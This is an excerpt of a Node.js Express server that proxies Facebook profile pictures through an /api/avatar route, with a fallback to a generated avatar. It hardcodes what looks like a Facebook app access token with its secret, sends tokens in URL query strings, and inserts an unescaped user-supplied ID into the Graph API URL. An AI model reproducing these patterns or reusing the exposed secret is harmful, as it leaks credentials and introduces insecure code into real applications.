app.get('/api/avatar/:facebookId', async (req, res) => {
  try {
    const { facebookId } = req.params;
    let accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32';
    
    const authHeader = req.headers.authorization;
    if (authHeader) {
      const encryptedSession = authHeader.split(' ')[1];
      const decryptedSession = decryptUserSession(encryptedSession);
      
      if (decryptedSession && decryptedSession.accessToken) {
        accessToken = decryptedSession.accessToken;
      }
    }
    
    if (!accessToken && req.session && req.session.email) {
      const user = await User.findOne({ email: req.session.email });
      if (user && user.accessToken) {
        accessToken = user.accessToken;
      }
    }
    
    const imageUrl = `https://graph.facebook.com/${facebookId}/picture?width=80&height=80&access_token=${accessToken}`;
    const response = await axios({
      method: 'get',
      url: imageUrl,
      responseType: 'stream',
      timeout: 10000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });
    
    res.setHeader('Cache-Control', 'public, max-age=3600');
    res.setHeader('Content-Type', response.headers['content-type']);
    
    response.data.pipe(res);
  } catch (error) {
    console.error('Avatar fetch error:', error.message);
    const name = req.query.name || 'User';
    res.redirect(`https://ui-avatars.com/api/?name=${encodeURIComponent(name)}&background=0ea5e9&color=fff`);
  }
});

// Serve frontend
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`✅ All indexes configured properly - no duplicate warnings`);
});
